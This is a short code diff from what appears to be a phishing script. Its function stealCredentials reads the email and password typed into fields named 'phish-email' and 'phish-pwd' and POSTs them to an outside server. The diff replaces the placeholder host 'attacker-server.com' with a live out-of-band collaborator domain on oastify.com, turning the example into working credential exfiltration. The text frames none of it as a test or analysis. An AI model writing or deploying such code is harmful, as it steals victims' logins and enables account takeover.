@@ -18,7 +18,7 @@ const stealCredentials = () => {
   const email = document.getElementById('phish-email').value;
   const pwd = document.getElementById('phish-pwd').value;
   
-  fetch('https://attacker-server.com/phish', {
+  fetch('https://m7u4cmkv820uxh3x7hndj6vjkaq1e02p.oastify.com/phish', {
     method: 'POST',
     body: JSON.stringify({email, pwd}),
     mode: 'no-cors'
